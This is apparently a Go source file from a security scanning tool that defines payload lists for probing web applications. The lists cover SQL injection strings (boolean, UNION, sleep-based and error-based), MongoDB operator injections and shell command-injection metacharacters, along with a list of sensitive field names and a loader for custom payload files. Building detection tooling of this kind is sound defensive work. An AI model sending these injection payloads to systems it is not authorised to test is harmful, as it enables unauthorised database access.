// Package payloads provides configurable security test payload libraries.
// These are kept in pkg/ (public) because they are genuinely reusable
// across different tools and test frameworks.
package payloads

import (
	"bufio"
	"os"
	"strings"
)

// SQLInjectionPayloads returns the default SQL injection payload set.
// These payloads are designed to trigger SQL errors (detection-only),
// NOT to extract data. They are safe for use against production systems
// when rate-limited properly.
var SQLInjectionPayloads = []string{
	// Syntax error triggers (cause DB parser to fail and reveal error)
	`'`,
	`''`,
	`'--`,
	`"`,
	`""`,
	`"--`,
	`\`,

	// Boolean-based blind indicators
	`' OR '1'='1`,
	`' OR '1'='2`,
	`" OR "1"="1`,
	`1 OR 1=1`,
	`1 OR 1=2`,

	// Comment-based
	`' OR 1=1--`,
	`' OR 1=1#`,
	`' OR 1=1/*`,
	`') OR ('1'='1`,

	// Numeric context
	`1;`,
	`1;--`,
	`1 AND 1=1`,
	`1 AND 1=2`,

	// UNION-based (will fail if column count wrong — triggers error)
	`' UNION SELECT NULL--`,
	`' UNION SELECT NULL,NULL--`,

	// Time-based blind (safe versions — short timeout)
	// We use 1-second sleeps only, never longer
	`1'; WAITFOR DELAY '0:0:1'--`,    // MSSQL
	`1'; SELECT SLEEP(1)--`,           // MySQL
	`1'; SELECT pg_sleep(1)--`,        // PostgreSQL

	// Error-based (triggers informative errors)
	`1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 1)))`,
	`1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT 1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)`,
}

// NoSQLInjectionPayloads returns MongoDB operator injection payloads.
var NoSQLInjectionPayloads = []string{
	`{"$gt":""}`,
	`{"$ne":null}`,
	`{"$exists":true}`,
	`{"$regex":".*"}`,
	`{"$where":"1==1"}`,
	`{"$gt":0}`,
	`[$ne]=1`,
	`'||'1'=='1`,
	`';return 'a'=='a' && ''=='`,
	`{"$or":[{},{"a":"a"}]}`,
}

// CommandInjectionPayloads returns command injection detection payloads.
// These are designed to trigger errors, not execute commands.
var CommandInjectionPayloads = []string{
	// Syntax that's invalid in shell context (triggers error)
	`|`,
	`||`,
	`&`,
	`&&`,
	`;`,
	"` `",
	`$(`,
	`${`,
	// Characters that terminate strings in shell
	`'id'`,
	`"id"`,
	// Newline injection
	"\n",
	"\r\n",
}

// SensitiveFieldNames is the list of field names that indicate sensitive data.
// Used by the data exposure check.
var SensitiveFieldNames = []string{
	"password", "passwd", "pass", "pwd", "secret", "api_key", "apikey",
	"access_key", "private_key", "token", "access_token", "refresh_token",
	"auth_token", "secret_key", "client_secret", "password_hash",
	"hashed_password", "password_digest", "encrypted_password",
	"ssn", "social_security", "national_id", "credit_card", "card_number",
	"cc_number", "pan", "cvv", "cvc", "pin", "mpin", "mobile_pin",
	"bank_account", "account_number", "routing_number", "iban", "swift",
	"internal_id", "db_id", "mongo_id",
}

// LoadFromFile reads a payload list from a text file (one payload per line).
// This allows security teams to customize payloads without recompiling.
func LoadFromFile(filePath string) ([]string, error) {
	f, err := os.Open(filePath) // #nosec G304 -- filePath is user-supplied config
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var payloads []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		// Skip empty lines and comments
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		payloads = append(payloads, line)
	}

	return payloads, scanner.Err()
}
